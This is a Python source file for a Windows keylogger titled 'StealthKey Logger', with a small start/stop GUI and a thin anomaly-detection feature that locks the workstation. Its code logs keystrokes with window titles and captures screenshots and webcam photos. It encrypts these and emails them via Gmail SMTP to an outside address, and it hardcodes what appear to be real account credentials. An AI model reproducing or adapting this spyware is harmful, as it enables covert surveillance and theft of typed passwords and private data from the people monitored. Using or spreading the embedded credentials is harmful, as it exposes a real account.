import threading
import platform
import psutil
import time
from datetime import datetime
import win32gui
import logging
from PIL import ImageGrab
import cv2
from pynput import keyboard
from cryptography.fernet import Fernet
import smtplib
import os
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import pandas as pd
from sklearn.svm import OneClassSVM
import joblib
import ctypes
import warnings
import tkinter as tk
import subprocess
# Global Variables
log = ""
current_window = ""
encryption_key = Fernet.generate_key() 
print(f"Encryption Key: {encryption_key.decode()}")
cipher = Fernet(encryption_key)


# Email Configuration
EMAIL_ADDRESS =  "km4588669@gmail.com" 
EMAIL_PASSWORD = "hibf wuwq jggm szan"
SEND_TO_EMAIL = "mounesh.ad22@bitsathy.ac.in"
SMTP_SERVER = "smtp.gmail.com"
SMTP_PORT = 587

MODEL_FILE = r"anomaly_detector_oneclass.pkl"

# Load the trained anomaly detection model
try:
    anomaly_detector = joblib.load(MODEL_FILE)
    print("Anomaly detection model loaded successfully.")
except FileNotFoundError:
    print("Error: Trained model file not found.")
    anomaly_detector = None  

def show_warning():
    """Display a warning message and disable user operations."""
    ctypes.windll.user32.MessageBoxW(0, "Anomalous activity detected! Operations blocked.", "Warning", 0x10)
    ctypes.windll.user32.LockWorkStation()

def analyze_word(word):
    """Analyze a typed word for anomalies."""
    global anomaly_detector
    print(f"Analyzing word: {word}")  
    if anomaly_detector:
        try:
            word_length = [[len(word)]]
            prediction = anomaly_detector.predict(word_length)
            print(f"Prediction for '{word}': {prediction[0]}") 
            if prediction[0] == -1: 
                print(f"Anomalous word detected: {word}")
                show_warning()
        except Exception as e:
            print(f"Error in analyzing word '{word}': {e}")  

# Convert bytes to human-readable format
def convert_bytes(bytes_value):
    for x in ['bytes', 'KB', 'MB', 'GB', 'TB']:
        if bytes_value < 1024.0:
            return "%3.1f %s" % (bytes_value, x)
        bytes_value /= 1024.0

# Gathering system information
def get_system_info():
    system_info = {}
    system_info['OS'] = platform.system()
    system_info['OS Version'] = platform.version()
    system_info['Platform'] = platform.platform()
    system_info['Architecture'] = platform.architecture()
    
    # CPU Info
    system_info['CPU Cores'] = psutil.cpu_count(logical=False)
    system_info['Logical CPUs'] = psutil.cpu_count(logical=True)
    system_info['CPU Usage'] = psutil.cpu_percent(interval=1)
    
    # Memory Info
    memory_info = psutil.virtual_memory()
    system_info['Total RAM'] = convert_bytes(memory_info.total)
    system_info['Used RAM'] = convert_bytes(memory_info.used)
    system_info['Memory Usage'] = memory_info.percent
    
    # Disk Info
    disk_info = psutil.disk_usage('/')
    system_info['Disk Usage'] = disk_info.percent
    system_info['Total Disk Space'] = convert_bytes(disk_info.total)
    
    # Boot Time
    boot_time = datetime.fromtimestamp(psutil.boot_time())
    system_info['Boot Time'] = boot_time.strftime("%Y-%m-%d %H:%M:%S")
    
    return system_info

# Contextual Logging
def get_active_window():
    """Retrieve the title of the currently active window."""
    try:
        return win32gui.GetWindowText(win32gui.GetForegroundWindow())
    except Exception:
        return "Unknown Window"

def log_keystrokes(key):
    """Log keystrokes with contextual information."""
    global log, current_window
    new_window = get_active_window()
    if new_window != current_window:
        current_window = new_window
        log += f"\n[{datetime.now()}] - Active Window: {current_window}\n"
    log += f"{str(key)} "

def save_and_encrypt_log():
    """Save the log to a file and encrypt it."""
    global log
    if log:
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        log_file = f"contextual_log_{timestamp}.txt"
        encrypted_log_file = f"encrypted_{log_file}"
        with open(log_file, "w",encoding='utf-8') as file:
            file.write(log)
        with open(log_file, "rb") as file:
            encrypted_data = cipher.encrypt(file.read())
        with open(encrypted_log_file, "wb") as file:
            file.write(encrypted_data)
        #os.remove(log_file)  # Remove plaintext file
        log = ""  
        return encrypted_log_file
    return None

def periodic_contextual_logging(interval=300):
    """Save and encrypt contextual logs periodically."""
    while True:
        encrypted_log_file = save_and_encrypt_log()
        if encrypted_log_file:
            send_email([encrypted_log_file])  
            #os.remove(encrypted_log_file)
        time.sleep(interval)

def periodic_system_info_logging():
    system_info_file = "system_info.txt"
    while True:
        system_info = get_system_info()
        system_info_log = "\n".join([f"{key}: {value}" for key, value in system_info.items()])
        logging.info(f"\nSystem Info Log:\n{system_info_log}")

        try:
            with open(system_info_file, 'w') as file:
                for key, value in system_info.items():
                    file.write(f"{key}: {value}\n")
            print(f"System information saved to {system_info_file}")
        except Exception as e:
            print(f"Error saving system information: {e}")

        time.sleep(3600)

# Screenshot Capturing
def capture_screenshot():
    """Capture the current screen and save it as a file."""
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    screenshot_file = f"screenshot_{timestamp}.png"
    screenshot = ImageGrab.grab()
    screenshot.save(screenshot_file)
    return screenshot_file

def periodic_screenshot(interval=600):
    """Capture screenshots periodically and send via email."""
    while True:
        screenshot_file = capture_screenshot()
        send_email([screenshot_file])  
        os.remove(screenshot_file)  
        time.sleep(interval)

# Camera Access
def capture_camera_image():
    """Capture an image using the default camera."""
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    camera_file = f"camera_{timestamp}.png"
    cap = cv2.VideoCapture(0)  
    if not cap.isOpened():
        print("Camera is not accessible.")
        return None  
    ret, frame = cap.read()
    if ret:
        cv2.imwrite(camera_file, frame)
        cap.release()
        return camera_file
    cap.release()
    print("Failed to capture an image from the camera.")
    return None

def periodic_camera_capture(interval=1200):
    """Capture camera images periodically and send via email."""
    while True:
        camera_file = capture_camera_image()
        if camera_file:
            send_email([camera_file]) 
            if os.path.exists(camera_file):
                os.remove(camera_file)  
        time.sleep(interval)
string=''
# Keystroke Logging
def on_press(key):
    """Callback function for key press events."""
    global string
    try:
        if hasattr(key, 'char') and key.char:
            string+=key.char
            log_keystrokes(key.char) 
        elif key == keyboard.Key.space:
            log_keystrokes(" [SPACE] ")
        elif key == keyboard.Key.enter:
            analyze_word(string)
            log_keystrokes(" [ENTER] \n")
            string=''
        else:
            log_keystrokes(f" [{key.name.upper()}] ")
    except Exception as e:
        print(f"Error in key press logging: {e}")

def on_release(key):
    """Callback function for key release events."""
    if key == keyboard.Key.esc:
        print("Exiting keylogger...")
        return False  

def start_keyboard_listener():
    """Start the keyboard listener for real-time logging."""
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

# Email Sending
def send_email(files):
    """Send email with attached files."""
    try:
        msg = MIMEMultipart()
        msg['From'] = EMAIL_ADDRESS
        msg['To'] = SEND_TO_EMAIL
        msg['Subject'] = "Keylogger Logs"
        for file in files:
            with open(file, "rb") as f:
                part = MIMEBase("application", "octet-stream")
                part.set_payload(f.read())
            encoders.encode_base64(part)
            part.add_header(
                "Content-Disposition",
                f"attachment; filename={os.path.basename(file)}",
            )
            msg.attach(part)
        server = smtplib.SMTP(SMTP_SERVER, SMTP_PORT)
        server.starttls()
        server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
        server.sendmail(EMAIL_ADDRESS, SEND_TO_EMAIL, msg.as_string())
        server.quit()
        print(f"Email sent with files: {files}")
    except Exception as e:
        print(f"Failed to send email: {e}")


# Start Monitoring Threads
def start_monitoring(process):
    """Start all periodic logging and capture threads."""
    if process:
        threading.Thread(target=periodic_contextual_logging, args=(60,), daemon=True).start()  
        threading.Thread(target=periodic_screenshot, args=(60,), daemon=True).start() 
        threading.Thread(target=periodic_camera_capture, args=(1200,), daemon=True).start() 
        threading.Thread(target=periodic_system_info_logging).start()
        threading.Thread(target=start_keyboard_listener).start()
    else:
        return
# Main Execution
if __name__ == "__main__":
    process = False
    def start_logging():
        global process
        process = True
        status_label.config(text="Status: Running", fg="green")
        start_monitoring(process)

    def stop_logging():
        global process
        status_label.config(text="Status: Stopped", fg="red")
        process = False
        

        # GUI Setup
root = tk.Tk()
root.title("StealthKey Logger")
root.geometry("300x200")

status_label = tk.Label(root, text="Status: Stopped", fg="red", font=("Arial", 12))
status_label.pack(pady=10)

start_button = tk.Button(root, text="Start Keylogger", command=start_logging, bg="green", fg="white", font=("Arial", 12))
start_button.pack(pady=5)

stop_button = tk.Button(root, text="Stop Keylogger", command=stop_logging, bg="red", fg="white", font=("Arial", 12))
stop_button.pack(pady=5)

root.mainloop()
